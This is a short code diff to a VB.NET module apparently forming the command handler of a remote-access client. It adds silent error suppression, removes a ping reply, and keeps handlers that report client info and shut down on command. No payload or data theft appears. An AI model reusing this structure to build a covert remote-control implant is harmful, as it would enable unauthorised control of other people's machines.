@@ -174,12 +174,11 @@ Public Module Core
 
 
     Private Sub Data(ByVal b As Byte()) Handles C.Data
+        On Error Resume Next
         Dim DATA As String() = Split(BS(b), LKEY)
         Select Case DATA(0)
             Case "info"
                 C.Send("info" & LKEY & ID.Hello())
-            Case "PP"
-                C.Send("PP")
          '###############################################################################
             Case "Close"
                 End
